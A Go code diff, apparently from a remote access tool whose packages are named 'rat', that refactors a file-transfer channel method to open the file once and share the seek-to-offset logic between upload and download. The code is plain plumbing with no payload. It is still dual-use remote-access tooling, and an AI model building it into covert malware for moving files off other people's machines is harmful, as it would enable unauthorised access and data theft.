@@ -4,7 +4,6 @@ import (
 	"encoding/binary"
 	"fmt"
 	"io"
-	"os"
 	"rat/shared"
 	"rat/shared/network/header"
 )
@@ -20,32 +19,24 @@ func (ChannelTransfer) Header() header.PacketHeader {
 func (ch ChannelTransfer) Open(r io.ReadWriteCloser, c *Client) error {
 	defer r.Close()
 
-	var fp *os.File
-	var err error
+	fp, err := ch.Transfer.Open()
 
-	if ch.Transfer.Download {
-		fp, err = os.Create(ch.Transfer.Local)
-	} else {
-		fp, err = os.Open(ch.Transfer.Local)
+	if err != nil {
+		panic(err)
 	}
 
 	binary.Write(r, binary.LittleEndian, ch.Transfer.Download)
 	binary.Write(r, binary.LittleEndian, ch.Transfer.Offset)
 	shared.WriteString(r, ch.Transfer.Remote)
 
-	if ch.Transfer.Download {
-		fp, err = os.OpenFile(ch.Transfer.Local, os.O_RDWR|os.O_CREATE, 0666)
+	if ch.Transfer.Offset > 0 {
+		_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
 		if err != nil {
 			panic(err)
 		}
+	}
 
-		if ch.Transfer.Offset > 0 {
-			_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
-			if err != nil {
-				panic(err)
-			}
-		}
-
+	if ch.Transfer.Download {
 		b := make([]byte, 1024<<3)
 		for err == nil {
 			var n int
@@ -54,18 +45,6 @@ func (ch ChannelTransfer) Open(r io.ReadWriteCloser, c *Client) error {
 			fmt.Println(err)
 		}
 	} else {
-		fp, err = os.Open(ch.Transfer.Local)
-		if err != nil {
-			panic(err)
-		}
-
-		if ch.Transfer.Offset > 0 {
-			_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
-			if err != nil {
-				panic(err)
-			}
-		}
-
 		b := make([]byte, 1024<<3)
 		for err == nil {
 			var n int
